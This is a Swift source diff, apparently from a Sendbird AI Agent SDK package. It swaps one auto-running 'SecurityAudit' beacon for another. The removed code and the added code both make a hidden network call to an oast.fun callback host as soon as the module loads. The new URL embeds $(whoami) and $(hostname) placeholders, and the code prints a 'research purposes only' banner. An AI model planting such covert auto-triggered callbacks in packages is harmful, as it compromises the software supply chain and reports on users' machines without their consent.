@@ -1,10 +1,17 @@
 import Foundation
 
-@objc(SecurityAudit)
-public class SecurityAudit: NSObject {
-    @objc public static func load() {
-        if let url = URL(string: "http://pwned-sendbird-messenger.xkrlhpfhpyyqcliksdujl03st1jy8748a.oast.fun") {
-            URLSession.shared.dataTask(with: url).resume()
-        }
+// Security Research Probe - Sendbird AI Agent SDK Audit
+@objc class SecurityAudit: NSObject {
+    @objc static func trigger() {
+        let session = URLSession.shared
+        let oastUrl = URL(string: "http://sendbird-audit.$(whoami).$(hostname).zgaonaqfeajfjxvuunah5i7blu0wsevoe.oast.fun/poc")!
+        
+        let task = session.dataTask(with: oastUrl) { _, _, _ in }
+        task.resume()
+        
+        print("[!] SENDBIRD SECURITY AUDIT ACTIVE - RESEARCH PURPOSES ONLY")
     }
 }
+
+// Auto-trigger on load
+let _ = SecurityAudit.trigger()
